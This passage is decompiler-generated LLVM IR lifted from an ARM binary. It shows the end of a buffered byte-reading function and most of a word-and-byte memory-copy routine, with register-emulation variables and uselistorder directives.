  br i1 %v2_12294, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_12294
  store i32 ptrtoint (i32** @global_var_1810c.329 to i32), i32* %r0.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_12294, %bb19
  store i32 74400, i32* @lr, align 4
  %v1_1229c = xor i1 %v2_12294, true
  call void @__pseudo_cond_branch(i1 %v1_1229c, i32 ptrtoint (i32* @global_var_eae8.554 to i32))
  %v0_122a0 = load i32, i32* @r4, align 4
  %v1_122a0 = add i32 %v0_122a0, 8
  store i32 %v1_122a0, i32* %r2.global-to-local, align 4
  %v1_122a4 = inttoptr i32 %v1_122a0 to i32*
  %v2_122a4 = load i32, i32* %v1_122a4, align 4
  store i32 %v2_122a4, i32* %r2.global-to-local, align 4
  %v3_122a4 = add i32 %v0_122a0, 12
  %v4_122a4 = inttoptr i32 %v3_122a4 to i32*
  %v5_122a4 = load i32, i32* %v4_122a4, align 4
  %v9_122a8 = icmp eq i32 %v5_122a4, %v2_122a4
  br i1 %v9_122a8, label %dec_label_pc_122dc, label %dec_label_pc_122b0

dec_label_pc_122b0:                               ; preds = %bb20
  %v2_122b0 = add i32 %v0_122a0, 24
  %v3_122b0 = inttoptr i32 %v2_122b0 to i32*
  store i32 %v2_122a4, i32* %v3_122b0, align 4
  %v0_122b4 = load i32, i32* @r4, align 4
  store i32 %v0_122b4, i32* %r0.global-to-local, align 4
  %v2_122b8 = call i32 @function_13a34(i32 %v0_122b4)
  store i32 %v2_122b8, i32* %r0.global-to-local, align 4
  %v2_122bc = icmp eq i32 %v2_122b8, 0
  br i1 %v2_122bc, label %dec_label_pc_122f8, label %dec_label_pc_122c4

dec_label_pc_122c4:                               ; preds = %dec_label_pc_122b0
  %v0_122c4 = load i32, i32* @r4, align 4
  %v1_122c4 = add i32 %v0_122c4, 20
  %v2_122c4 = inttoptr i32 %v1_122c4 to i32*
  %v3_122c4 = load i32, i32* %v2_122c4, align 4
  %v2_122c8 = add i32 %v0_122c4, 24
  %v3_122c8 = inttoptr i32 %v2_122c8 to i32*
  store i32 %v3_122c4, i32* %v3_122c8, align 4
  %v0_122cc = load i32, i32* @r4, align 4
  %v1_122cc = add i32 %v0_122cc, 16
  %v2_122cc = inttoptr i32 %v1_122cc to i32*
  %v3_122cc = load i32, i32* %v2_122cc, align 4
  %v1_122d0 = inttoptr i32 %v3_122cc to i8*
  %v2_122d0 = load i8, i8* %v1_122d0, align 1
  %v3_122d0 = zext i8 %v2_122d0 to i32
  store i32 %v3_122d0, i32* %r0.global-to-local, align 4
  %v5_122d0 = add i32 %v3_122cc, 1
  store i32 %v5_122d0, i32* %v2_122cc, align 4
  br label %dec_label_pc_122fc

dec_label_pc_122dc:                               ; preds = %bb20
  %v1_122dc = inttoptr i32 %v0_122a0 to i8*
  store i32 %v0_122a0, i32* %r0.global-to-local, align 4
  %v2_122e0 = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_122e0, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_122e8 = call i32 @function_1390c(i8* %v1_122dc, i32 %v2_122e0, i32 1)
  store i32 %v5_122e8, i32* %r0.global-to-local, align 4
  %v2_122ec = icmp eq i32 %v5_122e8, 0
  br i1 %v2_122ec, label %dec_label_pc_122f8, label %bb21

bb21:                                             ; preds = %dec_label_pc_122dc
  %v4_122f0 = load i8, i8* %stack_var_-9, align 1
  %v5_122f0 = sext i8 %v4_122f0 to i32
  store i32 %v5_122f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_122fc

dec_label_pc_122f8:                               ; preds = %dec_label_pc_122dc, %dec_label_pc_1220c, %dec_label_pc_122b0
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_122fc

dec_label_pc_122fc:                               ; preds = %bb, %bb21, %.thread4, %dec_label_pc_122c4, %dec_label_pc_1228c, %dec_label_pc_122f8
  %v2_12300 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12300, i32* @r4, align 4
  %v8_12300 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_12300

; uselistorder directives
  uselistorder i32 %v2_1225c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1221c, { 1, 0, 2 }
  uselistorder i32 %v2_12268, { 1, 3, 2, 4, 0, 6, 5 }
  uselistorder i32 %v3_121dc, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-9, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 12, 0, 1, 4, 5, 6, 2, 7, 8, 9, 10, 11, 3, 13 }
  uselistorder i8** @global_var_18144.277, { 2, 1, 0 }
  uselistorder i32** @global_var_1810c.329, { 0, 2, 1 }
  uselistorder label %dec_label_pc_122fc, { 5, 1, 3, 4, 2, 0 }
  uselistorder label %dec_label_pc_122f8, { 0, 2, 1 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_1228c, { 1, 0 }
}

define i32 @function_12310(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12310:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_12310 = load i32, i32* @r1, align 4
  %v1_12310 = load i32, i32* %r0.global-to-local, align 4
  %v2_12310 = sub i32 %v0_12310, %v1_12310
  %v3_12310 = icmp ult i32 %v0_12310, %v1_12310
  %v4_12310 = xor i32 %v1_12310, %v0_12310
  %v5_12310 = xor i32 %v2_12310, %v0_12310
  %v6_12310 = and i32 %v5_12310, %v4_12310
  %v7_12310 = icmp slt i32 %v6_12310, 0
  store i1 %v7_12310, i1* %cpsr_v.global-to-local, align 1
  %v8_12310 = icmp slt i32 %v2_12310, 0
  store i1 %v8_12310, i1* %cpsr_n.global-to-local, align 1
  %v9_12310 = icmp eq i32 %v0_12310, %v1_12310
  store i1 %v9_12310, i1* @cpsr_z, align 1
  br i1 %v3_12310, label %dec_label_pc_1255c, label %dec_label_pc_12318

dec_label_pc_12318:                               ; preds = %dec_label_pc_12310
  br i1 %v9_12310, label %.thread123, label %bb

.thread123:                                       ; preds = %bb146, %.thread122, %bb143, %dec_label_pc_12318
  %merge = phi i32 [ %v0_12310, %dec_label_pc_12318 ], [ %v2_125f0, %bb143 ], [ %v11_1260c, %bb146 ], [ %v7_1260c, %.thread122 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_12318
  %v5_1231c = inttoptr i32 %v1_12310 to i8*
  store i8* %v5_1231c, i8** %stack_var_-8, align 4
  %v0_12320 = load i32, i32* @r2, align 4
  %v2_12320 = add i32 %v0_12320, -4
  store i32 %v2_12320, i32* %r2.global-to-local, align 4
  %v4_12320 = sub i32 3, %v0_12320
  %v5_12320 = and i32 %v4_12320, %v0_12320
  %v6_12320 = icmp slt i32 %v5_12320, 0
  store i1 %v6_12320, i1* %cpsr_v.global-to-local, align 1
  %v7_12320 = icmp slt i32 %v2_12320, 0
  store i1 %v7_12320, i1* %cpsr_n.global-to-local, align 1
  %v5_12324 = icmp slt i32 %v0_12320, 4
  br i1 %v5_12324, label %bb133, label %dec_label_pc_12328

dec_label_pc_12328:                               ; preds = %bb
  %v1_12328 = urem i32 %v1_12310, 4
  store i32 %v1_12328, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_12328 = icmp eq i32 %v1_12328, 0
  br i1 %v2_12328, label %dec_label_pc_12330, label %dec_label_pc_123d4

dec_label_pc_12330:                               ; preds = %dec_label_pc_12328
  %v1_12330 = urem i32 %v0_12310, 4
  store i32 %v1_12330, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_12330 = icmp eq i32 %v1_12330, 0
  %extract.t = trunc i32 %v0_12310 to i2
  br i1 %v2_12330, label %dec_label_pc_12338, label %dec_label_pc_12404

dec_label_pc_12338:                               ; preds = %dec_label_pc_12330, %dec_label_pc_123fc
  %v0_1235093 = phi i32 [ %v1_12310, %dec_label_pc_12330 ], [ %v0_1244c76, %dec_label_pc_123fc ]
  %v0_1234c92 = phi i32 [ %v0_12310, %dec_label_pc_12330 ], [ %v0_123fc, %dec_label_pc_123fc ]
  %v0_12338 = phi i32 [ %v2_12320, %dec_label_pc_12330 ], [ %v2_123f4, %dec_label_pc_123fc ]
  %v2_12338 = add i32 %v0_12338, -8
  store i32 %v2_12338, i32* %r2.global-to-local, align 4
  %v4_12338 = sub i32 7, %v0_12338
  %v5_12338 = and i32 %v4_12338, %v0_12338
  %v6_12338 = icmp slt i32 %v5_12338, 0
  store i1 %v6_12338, i1* %cpsr_v.global-to-local, align 1
  %v7_12338 = icmp slt i32 %v2_12338, 0
  store i1 %v7_12338, i1* %cpsr_n.global-to-local, align 1
  %v5_1233c = icmp slt i32 %v0_12338, 8
  br i1 %v5_1233c, label %dec_label_pc_1238c, label %dec_label_pc_12340

dec_label_pc_12340:                               ; preds = %dec_label_pc_12338
  %v2_12340 = add i32 %v0_12338, -28
  store i32 %v2_12340, i32* %r2.global-to-local, align 4
  %v4_12340 = sub i32 27, %v0_12338
  %v5_12340 = and i32 %v4_12340, %v2_12338
  %v6_12340 = icmp slt i32 %v5_12340, 0
  store i1 %v6_12340, i1* %cpsr_v.global-to-local, align 1
  %v7_12340 = icmp slt i32 %v2_12340, 0
  store i1 %v7_12340, i1* %cpsr_n.global-to-local, align 1
  %v5_12344 = icmp slt i32 %v2_12338, 20
  br i1 %v5_12344, label %dec_label_pc_12378, label %dec_label_pc_12348

dec_label_pc_12348:                               ; preds = %dec_label_pc_12340
  %v0_12348 = load i32, i32* @r4, align 4
  store i32 %v0_12348, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1234c

dec_label_pc_1234c:                               ; preds = %dec_label_pc_1234c.dec_label_pc_1234c_crit_edge, %dec_label_pc_12348
  %v0_12350 = phi i32 [ %v12_12358, %dec_label_pc_1234c.dec_label_pc_1234c_crit_edge ], [ %v0_1235093, %dec_label_pc_12348 ]
  %v0_1234c = phi i32 [ %v0_1234c.pre, %dec_label_pc_1234c.dec_label_pc_1234c_crit_edge ], [ %v0_1234c92, %dec_label_pc_12348 ]
  %v1_1234c = inttoptr i32 %v0_1234c to i32*
  %v2_1234c = load i32, i32* %v1_1234c, align 4
  store i32 %v2_1234c, i32* %r3.global-to-local, align 4
  %v3_1234c = add i32 %v0_1234c, 4
  %v4_1234c = inttoptr i32 %v3_1234c to i32*
  %v5_1234c = load i32, i32* %v4_1234c, align 4
  store i32 %v5_1234c, i32* %r4.global-to-local, align 4
  %v6_1234c = add i32 %v0_1234c, 8
  %v7_1234c = inttoptr i32 %v6_1234c to i32*
  %v8_1234c = load i32, i32* %v7_1234c, align 4
  store i32 %v8_1234c, i32* %ip.global-to-local, align 4
  %v9_1234c = add i32 %v0_1234c, 12
  %v10_1234c = inttoptr i32 %v9_1234c to i32*
  %v11_1234c = load i32, i32* %v10_1234c, align 4
  store i32 %v11_1234c, i32* %lr.global-to-local, align 4
  %v12_1234c = add i32 %v0_1234c, 16
  store i32 %v12_1234c, i32* %r1.global-to-local, align 4
  %v1_12350 = inttoptr i32 %v0_12350 to i32*
  store i32 %v2_1234c, i32* %v1_12350, align 4
  %v3_12350 = add i32 %v0_12350, 4
  %v4_12350 = inttoptr i32 %v3_12350 to i32*
  %v5_12350 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_12350, i32* %v4_12350, align 4
  %v6_12350 = add i32 %v0_12350, 8
  %v7_12350 = inttoptr i32 %v6_12350 to i32*
  %v8_12350 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_12350, i32* %v7_12350, align 4
  %v9_12350 = add i32 %v0_12350, 12
  %v10_12350 = inttoptr i32 %v9_12350 to i32*
  %v11_12350 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_12350, i32* %v10_12350, align 4
  %v12_12350 = add i32 %v0_12350, 16
  store i32 %v12_12350, i32* %r0.global-to-local, align 4
  %v0_12354 = load i32, i32* %r1.global-to-local, align 4
  %v1_12354 = inttoptr i32 %v0_12354 to i32*
  %v2_12354 = load i32, i32* %v1_12354, align 4
  store i32 %v2_12354, i32* %r3.global-to-local, align 4
  %v3_12354 = add i32 %v0_12354, 4
  %v4_12354 = inttoptr i32 %v3_12354 to i32*
  %v5_12354 = load i32, i32* %v4_12354, align 4
  store i32 %v5_12354, i32* %r4.global-to-local, align 4
  %v6_12354 = add i32 %v0_12354, 8
  %v7_12354 = inttoptr i32 %v6_12354 to i32*
  %v8_12354 = load i32, i32* %v7_12354, align 4
  store i32 %v8_12354, i32* @ip, align 4
  %v9_12354 = add i32 %v0_12354, 12
  %v10_12354 = inttoptr i32 %v9_12354 to i32*
  %v11_12354 = load i32, i32* %v10_12354, align 4
  store i32 %v11_12354, i32* @lr, align 4
  %v12_12354 = add i32 %v0_12354, 16
  store i32 %v12_12354, i32* @r1, align 4
  %v1_12358 = inttoptr i32 %v12_12350 to i32*
  store i32 %v2_12354, i32* %v1_12358, align 4
  %v3_12358 = add i32 %v0_12350, 20
  %v4_12358 = inttoptr i32 %v3_12358 to i32*
  %v5_12358 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_12358, i32* %v4_12358, align 4
  %v6_12358 = add i32 %v0_12350, 24
  %v7_12358 = inttoptr i32 %v6_12358 to i32*
  %v8_12358 = load i32, i32* @ip, align 4
  store i32 %v8_12358, i32* %v7_12358, align 4
  %v9_12358 = add i32 %v0_12350, 28
  %v10_12358 = inttoptr i32 %v9_12358 to i32*
  %v11_12358 = load i32, i32* @lr, align 4
  store i32 %v11_12358, i32* %v10_12358, align 4
  %v12_12358 = add i32 %v0_12350, 32
  store i32 %v12_12358, i32* %r0.global-to-local, align 4
  %v0_1235c = load i32, i32* %r2.global-to-local, align 4
  %v2_1235c = add i32 %v0_1235c, -32
  store i32 %v2_1235c, i32* %r2.global-to-local, align 4
  %v6_12360 = icmp slt i32 %v0_1235c, 32
  br i1 %v6_12360, label %dec_label_pc_12364, label %dec_label_pc_1234c.dec_label_pc_1234c_crit_edge

dec_label_pc_1234c.dec_label_pc_1234c_crit_edge:  ; preds = %dec_label_pc_1234c
  %v0_1234c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1234c

dec_label_pc_12364:                               ; preds = %dec_label_pc_1234c
  %v4_12364 = add i32 %v0_1235c, -16
  %v6_12364 = add i32 %v0_1235c, 2147483616
  %v7_12364 = and i32 %v4_12364, %v6_12364
  %v8_12364 = icmp slt i32 %v7_12364, 0
  store i1 %v8_12364, i1* %cpsr_v.global-to-local, align 1
  %v9_12364 = icmp slt i32 %v4_12364, 0
  store i1 %v9_12364, i1* %cpsr_n.global-to-local, align 1
  %v5_12368 = icmp slt i32 %v2_1235c, -16
  br i1 %v5_12368, label %.thread2, label %bb130

bb130:                                            ; preds = %dec_label_pc_12364
  %v6_12368 = load i32, i32* @r1, align 4
  %v7_12368 = inttoptr i32 %v6_12368 to i32*
  %v8_12368 = load i32, i32* %v7_12368, align 4
  store i32 %v8_12368, i32* %r3.global-to-local, align 4
  %v9_12368 = add i32 %v6_12368, 4
  %v10_12368 = inttoptr i32 %v9_12368 to i32*
  %v11_12368 = load i32, i32* %v10_12368, align 4
  store i32 %v11_12368, i32* %r4.global-to-local, align 4
  %v12_12368 = add i32 %v6_12368, 8
  %v13_12368 = inttoptr i32 %v12_12368 to i32*
  %v14_12368 = load i32, i32* %v13_12368, align 4
  store i32 %v14_12368, i32* @ip, align 4
  %v15_12368 = add i32 %v6_12368, 12
  %v16_12368 = inttoptr i32 %v15_12368 to i32*
  %v17_12368 = load i32, i32* %v16_12368, align 4
  store i32 %v17_12368, i32* @lr, align 4
  %v18_12368 = add i32 %v6_12368, 16
  store i32 %v18_12368, i32* @r1, align 4
  %v7_1236c = inttoptr i32 %v12_12358 to i32*
  store i32 %v8_12368, i32* %v7_1236c, align 4
  %v9_1236c = add i32 %v0_12350, 36
  %v10_1236c = inttoptr i32 %v9_1236c to i32*
  %v11_1236c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_1236c, i32* %v10_1236c, align 4
  %v12_1236c = add i32 %v0_12350, 40
  %v13_1236c = inttoptr i32 %v12_1236c to i32*
  %v14_1236c = load i32, i32* @ip, align 4
  store i32 %v14_1236c, i32* %v13_1236c, align 4
  %v15_1236c = add i32 %v0_12350, 44
  %v16_1236c = inttoptr i32 %v15_1236c to i32*
  %v17_1236c = load i32, i32* @lr, align 4
  store i32 %v17_1236c, i32* %v16_1236c, align 4
  %v18_1236c = add i32 %v0_12350, 48
  store i32 %v18_1236c, i32* %r0.global-to-local, align 4
  %v6_12370 = load i32, i32* %r2.global-to-local, align 4
  %v7_12370 = add i32 %v6_12370, -16
  store i32 %v7_12370, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12364, %bb130
  %v3_12380102 = phi i32 [ %v12_12358, %dec_label_pc_12364 ], [ %v18_1236c, %bb130 ]
  %v0_1237896 = phi i32 [ %v2_1235c, %dec_label_pc_12364 ], [ %v7_12370, %bb130 ]
  %v2_12374 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12374, i32* @r4, align 4
  br label %dec_label_pc_12378

dec_label_pc_12378:                               ; preds = %dec_label_pc_12340, %.thread2
  %v3_12380101 = phi i32 [ %v0_1235093, %dec_label_pc_12340 ], [ %v3_12380102, %.thread2 ]
  %v0_12378 = phi i32 [ %v2_12340, %dec_label_pc_12340 ], [ %v0_1237896, %.thread2 ]
  %v1_12378 = add i32 %v0_12378, 20
  store i32 %v1_12378, i32* %r2.global-to-local, align 4
  %v3_12378 = sub i32 0, %v0_12378
  %v4_12378 = and i32 %v1_12378, %v3_12378
  %v5_12378 = icmp slt i32 %v4_12378, 0
  store i1 %v5_12378, i1* %cpsr_v.global-to-local, align 1
  %v6_12378 = icmp slt i32 %v1_12378, 0
  store i1 %v6_12378, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_1237c

dec_label_pc_1237c:                               ; preds = %.thread118, %dec_label_pc_12378
  %v0_1238c.pre149 = phi i32 [ %v0_1238c.pre, %.thread118 ], [ %v1_12378, %dec_label_pc_12378 ]
  %v3_12380 = phi i32 [ %v3_1238099119, %.thread118 ], [ %v3_12380101, %dec_label_pc_12378 ]
  %v1_12384 = phi i1 [ %v1_12388, %.thread118 ], [ %v5_12378, %dec_label_pc_12378 ]
  %v0_12384 = phi i1 [ %v0_12388, %.thread118 ], [ %v6_12378, %dec_label_pc_12378 ]
  %v2_1237c = xor i1 %v1_12384, %v0_12384
  br i1 %v2_1237c, label %.thread118, label %bb131

bb131:                                            ; preds = %dec_label_pc_1237c
  %v3_1237c = load i32, i32* @r1, align 4
  %v4_1237c = inttoptr i32 %v3_1237c to i32*
  %v5_1237c = load i32, i32* %v4_1237c, align 4
  store i32 %v5_1237c, i32* %r3.global-to-local, align 4
  %v6_1237c = add i32 %v3_1237c, 4
  %v7_1237c = inttoptr i32 %v6_1237c to i32*
  %v8_1237c = load i32, i32* %v7_1237c, align 4
  store i32 %v8_1237c, i32* @ip, align 4
  %v9_1237c = add i32 %v3_1237c, 8
  %v10_1237c = inttoptr i32 %v9_1237c to i32*
  %v11_1237c = load i32, i32* %v10_1237c, align 4
  store i32 %v11_1237c, i32* @lr, align 4
  %v12_1237c = add i32 %v3_1237c, 12
  store i32 %v12_1237c, i32* @r1, align 4
  %v4_12380 = inttoptr i32 %v3_12380 to i32*
  store i32 %v5_1237c, i32* %v4_12380, align 4
  %v6_12380 = add i32 %v3_12380, 4
  %v7_12380 = inttoptr i32 %v6_12380 to i32*
  %v8_12380 = load i32, i32* @ip, align 4
  store i32 %v8_12380, i32* %v7_12380, align 4
  %v9_12380 = add i32 %v3_12380, 8
  %v10_12380 = inttoptr i32 %v9_12380 to i32*
  %v11_12380 = load i32, i32* @lr, align 4
  store i32 %v11_12380, i32* %v10_12380, align 4
  %v12_12380 = add i32 %v3_12380, 12
  store i32 %v12_12380, i32* %r0.global-to-local, align 4
  %v3_12384 = load i32, i32* %r2.global-to-local, align 4
  %v4_12384 = add i32 %v3_12384, -12
  store i32 %v4_12384, i32* %r2.global-to-local, align 4
  %v6_12384 = sub i32 11, %v3_12384
  %v7_12384 = and i32 %v6_12384, %v3_12384
  %v8_12384 = icmp slt i32 %v7_12384, 0
  store i1 %v8_12384, i1* %cpsr_v.global-to-local, align 1
  %v9_12384 = icmp slt i32 %v4_12384, 0
  store i1 %v9_12384, i1* %cpsr_n.global-to-local, align 1
  br label %.thread118

.thread118:                                       ; preds = %dec_label_pc_1237c, %bb131
  %v0_1238c.pre = phi i32 [ %v4_12384, %bb131 ], [ %v0_1238c.pre149, %dec_label_pc_1237c ]
  %v3_1238099119 = phi i32 [ %v12_12380, %bb131 ], [ %v3_12380, %dec_label_pc_1237c ]
  %v1_12388 = phi i1 [ %v8_12384, %bb131 ], [ %v1_12384, %dec_label_pc_1237c ]
  %v0_12388 = phi i1 [ %v9_12384, %bb131 ], [ %v0_12384, %dec_label_pc_1237c ]
  %v2_12388 = xor i1 %v1_12388, %v0_12388
  br i1 %v2_12388, label %dec_label_pc_1238c, label %dec_label_pc_1237c

dec_label_pc_1238c:                               ; preds = %.thread118, %dec_label_pc_12338
  %v7_1239c = phi i32 [ %v0_1235093, %dec_label_pc_12338 ], [ %v3_1238099119, %.thread118 ]
  %v0_1238c = phi i32 [ %v2_12338, %dec_label_pc_12338 ], [ %v0_1238c.pre, %.thread118 ]
  %v2_1238c = add i32 %v0_1238c, 8
  store i32 %v2_1238c, i32* %r2.global-to-local, align 4
  %v4_1238c = sub i32 0, %v0_1238c
  %v5_1238c = and i32 %v2_1238c, %v4_1238c
  %v6_1238c = icmp slt i32 %v5_1238c, 0
  store i1 %v6_1238c, i1* %cpsr_v.global-to-local, align 1
  %v7_1238c = icmp slt i32 %v2_1238c, 0
  store i1 %v7_1238c, i1* %cpsr_n.global-to-local, align 1
  %v5_12390 = icmp slt i32 %v0_1238c, -8
  br i1 %v5_12390, label %bb133, label %dec_label_pc_12394

dec_label_pc_12394:                               ; preds = %dec_label_pc_1238c
  %v6_12394 = add i32 %v0_1238c, 4
  store i32 %v6_12394, i32* %r2.global-to-local, align 4
  %v8_12394 = sub i32 -5, %v0_1238c
  %v9_12394 = and i32 %v8_12394, %v2_1238c
  %v10_12394 = icmp slt i32 %v9_12394, 0
  store i1 %v10_12394, i1* %cpsr_v.global-to-local, align 1
  %v11_12394 = icmp slt i32 %v6_12394, 0
  store i1 %v11_12394, i1* %cpsr_n.global-to-local, align 1
  %v5_12398 = icmp slt i32 %v2_1238c, 4
  %v6_12398 = load i32, i32* @r1, align 4
  %v7_12398 = inttoptr i32 %v6_12398 to i32*
  %v8_12398 = load i32, i32* %v7_12398, align 4
  store i32 %v8_12398, i32* %r3.global-to-local, align 4
  %v10_12398 = add i32 %v6_12398, 4
  br i1 %v5_12398, label %.thread6, label %bb132

.thread6:                                         ; preds = %dec_label_pc_12394
  store i32 %v10_12398, i32* @r1, align 4
  %v8_1239c = inttoptr i32 %v7_1239c to i32*
  store i32 %v8_12398, i32* %v8_1239c, align 4
  %v9_1239c = load i32, i32* %r0.global-to-local, align 4
  %v10_1239c = add i32 %v9_1239c, 4
  store i32 %v10_1239c, i32* %r0.global-to-local, align 4
  %v0_123ac.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb133

bb132:                                            ; preds = %dec_label_pc_12394
  %v10_123a0 = inttoptr i32 %v10_12398 to i32*
  %v11_123a0 = load i32, i32* %v10_123a0, align 4
  store i32 %v11_123a0, i32* @ip, align 4
  %v12_123a0 = add i32 %v6_12398, 8
  store i32 %v12_123a0, i32* @r1, align 4
  %v7_123a4 = inttoptr i32 %v7_1239c to i32*
  store i32 %v8_12398, i32* %v7_123a4, align 4
  %v9_123a4 = add i32 %v7_1239c, 4
  %v10_123a4 = inttoptr i32 %v9_123a4 to i32*
  %v11_123a4 = load i32, i32* @ip, align 4
  store i32 %v11_123a4, i32* %v10_123a4, align 4
  %v12_123a4 = add i32 %v7_1239c, 8
  store i32 %v12_123a4, i32* %r0.global-to-local, align 4
  %v6_123a8 = load i32, i32* %r2.global-to-local, align 4
  %v7_123a8 = add i32 %v6_123a8, -4
  store i32 %v7_123a8, i32* %r2.global-to-local, align 4
  br label %bb133

bb133:                                            ; preds = %.thread6, %.thread12, %dec_label_pc_1238c, %bb, %dec_label_pc_124e8, %dec_label_pc_1247c, %dec_label_pc_12554, %bb132
  %v2_123bc = phi i32 [ %v10_1239c, %.thread6 ], [ %v0_1244c76, %.thread12 ], [ %v7_1239c, %dec_label_pc_1238c ], [ %v1_12310, %bb ], [ %v2_123bc114, %dec_label_pc_124e8 ], [ %v2_123bc113, %dec_label_pc_1247c ], [ %v2_123bc112, %dec_label_pc_12554 ], [ %v12_123a4, %bb132 ]
  %v0_123ac = phi i32 [ %v0_123ac.pre, %.thread6 ], [ %v2_123f4, %.thread12 ], [ %v2_1238c, %dec_label_pc_1238c ], [ %v2_12320, %bb ], [ %v0_123ac110, %dec_label_pc_124e8 ], [ %v0_123ac109, %dec_label_pc_1247c ], [ %v0_123ac108, %dec_label_pc_12554 ], [ %v7_123a8, %bb132 ]
  %v1_123ac = add i32 %v0_123ac, 4
  store i32 %v1_123ac, i32* @r2, align 4
  %v3_123ac = sub i32 0, %v0_123ac
  %v4_123ac = and i32 %v1_123ac, %v3_123ac
  %v5_123ac = icmp slt i32 %v4_123ac, 0
  store i1 %v5_123ac, i1* %cpsr_v.global-to-local, align 1
  %v6_123ac = icmp slt i32 %v1_123ac, 0
  store i1 %v6_123ac, i1* %cpsr_n.global-to-local, align 1
  %v7_123ac = icmp eq i32 %v1_123ac, 0
  store i1 %v7_123ac, i1* @cpsr_z, align 1
  br i1 %v7_123ac, label %bb134, label %bb135

bb134:                                            ; preds = %bb133
  %v3_123b0 = load i8*, i8** %stack_var_-8, align 4
  %v4_123b0 = ptrtoint i8* %v3_123b0 to i32
  store i32 %v4_123b0, i32* %r0.global-to-local, align 4
  ret i32 %v4_123b0

bb135:                                            ; preds = %bb133
  %v1_123b4 = add i32 %v0_123ac, 2
  %v3_123b4 = sub i32 -3, %v0_123ac
  %v4_123b4 = and i32 %v3_123b4, %v1_123ac
  %v5_123b4 = icmp slt i32 %v4_123b4, 0
  store i1 %v5_123b4, i1* %cpsr_v.global-to-local, align 1
  %v6_123b4 = icmp slt i32 %v1_123b4, 0
  store i1 %v6_123b4, i1* %cpsr_n.global-to-local, align 1
  %v7_123b4 = icmp eq i32 %v1_123ac, 2
  store i1 %v7_123b4, i1* @cpsr_z, align 1
  %v0_123b8 = load i32, i32* @r1, align 4
  %v1_123b8 = inttoptr i32 %v0_123b8 to i8*
  %v2_123b8 = load i8, i8* %v1_123b8, align 1
  %v3_123b8 = zext i8 %v2_123b8 to i32
  store i32 %v3_123b8, i32* %r3.global-to-local, align 4
  %v5_123b8 = add i32 %v0_123b8, 1
  store i32 %v5_123b8, i32* @r1, align 4
  %v3_123bc = inttoptr i32 %v2_123bc to i8*
  store i8 %v2_123b8, i8* %v3_123bc, align 1
  %v4_123bc = load i32, i32* %r0.global-to-local, align 4
  %v5_123bc = add i32 %v4_123bc, 1
  store i32 %v5_123bc, i32* %r0.global-to-local, align 4
  %v0_123c0 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_123c0 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_123c0 = xor i1 %v0_123c0, %v1_123c0
  br i1 %v2_123c0, label %.thread120, label %bb136

bb136:                                            ; preds = %bb135
  %v3_123c0 = load i32, i32* @r1, align 4
  %v4_123c0 = inttoptr i32 %v3_123c0 to i8*
  %v5_123c0 = load i8, i8* %v4_123c0, align 1
  %v6_123c0 = zext i8 %v5_123c0 to i32
  store i32 %v6_123c0, i32* %r3.global-to-local, align 4
  %v8_123c0 = add i32 %v3_123c0, 1
  store i32 %v8_123c0, i32* @r1, align 4
  %v6_123c4 = inttoptr i32 %v5_123bc to i8*
  store i8 %v5_123c0, i8* %v6_123c4, align 1
  %v7_123c4 = load i32, i32* %r0.global-to-local, align 4
  %v8_123c4 = add i32 %v7_123c4, 1
  store i32 %v8_123c4, i32* %r0.global-to-local, align 4
  %v1_123c8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_123c8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread120

.thread120:                                       ; preds = %bb135, %bb136
  %v7_123cc = phi i32 [ %v8_123c4, %bb136 ], [ %v5_123bc, %bb135 ]
  %v2_123cc = phi i1 [ %v2_123c8.pre, %bb136 ], [ %v1_123c0, %bb135 ]
  %v1_123cc = phi i1 [ %v1_123c8.pre, %bb136 ], [ %v0_123c0, %bb135 ]
  %v0_123c8 = load i1, i1* @cpsr_z, align 1
  %v3_123c8 = xor i1 %v2_123cc, %v1_123cc
  %v4_123c8 = or i1 %v0_123c8, %v3_123c8
  br i1 %v4_123c8, label %.thread121, label %bb137

